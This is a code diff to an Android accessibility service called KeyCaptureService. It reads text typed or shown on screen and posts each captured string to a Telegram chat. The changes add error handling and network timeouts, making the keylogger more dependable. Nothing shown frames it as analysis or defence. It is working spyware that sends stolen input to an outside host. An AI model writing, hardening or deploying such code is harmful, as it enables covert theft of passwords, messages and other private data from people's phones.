@@ -17,18 +17,24 @@ public class KeyCaptureService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        int eventType = event.getEventType();
-        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
-            List<CharSequence> textList = event.getText();
-            if (textList != null && !textList.isEmpty()) {
-                CharSequence textSeq = textList.get(0);
-                if (textSeq != null) {
-                    String capturedText = textSeq.toString().trim();
-                    if (!capturedText.isEmpty()) {
-                        sendToTelegram(capturedText);
+        try {
+            if (event == null) return;
+            
+            int eventType = event.getEventType();
+            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+                List<CharSequence> textList = event.getText();
+                if (textList != null && !textList.isEmpty()) {
+                    CharSequence textSeq = textList.get(0);
+                    if (textSeq != null) {
+                        String capturedText = textSeq.toString().trim();
+                        if (!capturedText.isEmpty()) {
+                            sendToTelegram(capturedText);
+                        }
                     }
                 }
             }
+        } catch (Exception e) {
+            Log.e(TAG, "Error in onAccessibilityEvent", e);
         }
     }
 
@@ -48,9 +54,10 @@ public class KeyCaptureService extends AccessibilityService {
                     conn.setRequestMethod("POST");
                     conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                     conn.setRequestProperty("Accept", "application/json");
+                    conn.setConnectTimeout(5000);
+                    conn.setReadTimeout(5000);
                     conn.setDoOutput(true);
 
-                    // Escape quotes to prevent malformed JSON payload
                     String sanitizedMessage = message.replace("\"", "\\\"");
                     String jsonInputString = "{\"chat_id\":\"" + CHAT_ID + "\", \"text\":\"" + sanitizedMessage + "\"}";
 
